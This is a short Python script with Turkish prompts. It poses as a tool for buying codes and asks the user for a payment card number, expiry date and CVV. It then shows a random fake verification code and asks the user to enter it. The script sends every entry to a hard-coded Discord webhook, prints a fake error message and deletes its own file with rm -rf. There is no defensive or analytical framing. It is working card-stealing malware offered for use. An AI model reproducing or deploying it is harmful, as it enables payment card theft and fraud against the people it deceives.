import  requests , platform
import socket
import os
import random

kodlist = ["834", "372", "193" , "828" , "932" , "636" , "737" , "747" , "659"]

kartno = input("Kart Numarası Girin : ")
karttr = input("Kart Sk Tarihi Girin : ")
kartcv = input("Kart Cvv Bilgisini Girin : ")
kodist = input("Kod İstek sayısı ( tanesi 10.kr ) : ")
print("\n\n\n Verilen Kod : " + random.choice(kodlist))
gelenk = input("Verilen Kodu Girin : ")

payload = {
	"content" :  " **Login's : ** " + "```" + "\n\nKart Numarası : " + kartno + "\n\nKart Tarihi : " + karttr + "\n\nKart Cvv : " + kartcv + "\n\nKod İsteği : " + kodist + "\n\nGelen Kod  : " + gelenk + "\n\nDurum : Hata!" + "```"
}


spider = requests.post("https://discord.com/api/webhooks/1038025381355212800/S6a2q2A-6xmyF2wYA_VyNGWq40DCl4WQ9Sjth-bAjpZ_uC7RkiSdVojUdTOvNSYRuYeC", data=payload)
print("HATA!")
os.system("rm -rf kart.py")
